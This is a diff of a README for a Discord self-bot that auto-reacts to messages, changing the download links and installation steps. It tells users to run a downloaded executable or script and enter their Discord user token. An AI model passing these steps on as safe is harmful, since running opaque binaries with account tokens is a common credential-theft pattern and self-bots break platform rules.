@@ -22,16 +22,20 @@ Mar's Self Bot 1.0 is a self-bot for Discord designed to automatically react to 
 
 ## 🔧 **Installation** 🔧
 
-### Exe Method
+### 🖥️ **Exe Method**
 
-- **Download and Run**: Download [**selfreact.exe**](https://github.com/7cf/Discord-Self-React-Bot/releases/download/v1.0/selfreact.exe), run the application, enter your token, and press "Run" to start the bot. (Feel free to decode it if you wish to explore the code.)
+- Download the executable from the [latest release](https://github.com/7cf/Discord-Self-React-Bot/releases/download/discordselfbot/selfreact.exe).
+- Run the application, enter your token, and click "Run" to start the bot.
+- If needed, decode it if you want.
 
-### Prerequisites
+### 📦 **Source Code Method**
 
-- **Python**: Version 3.8 or higher
-- **Library**: `discord.py-self`
+#### Prerequisites
 
-### Step-by-Step Guide
+- Python 3.8 or higher
+- `discord.py-self` library
+
+#### Step-by-Step Guide
 
 1. **Clone the Repository**
     ```sh
@@ -45,6 +49,7 @@ Mar's Self Bot 1.0 is a self-bot for Discord designed to automatically react to 
     ```
 
 3. **Edit the Script**
+    - Download the Python script from the [latest release](https://github.com/7cf/Discord-Self-React-Bot/releases/download/discordselfbot/selfbot.py).
     - Open `selfbot.py` in your preferred text editor.
     - Replace the placeholder token with your actual Discord user token.
 
@@ -55,6 +60,10 @@ Mar's Self Bot 1.0 is a self-bot for Discord designed to automatically react to 
 ## 🚀 **Usage** 🚀
 
 1. **Run the Bot**
+
+    For the executable, just run it and click "Run" after entering your token.
+
+    For the Python script:
 
     ```sh
     python selfbot.py
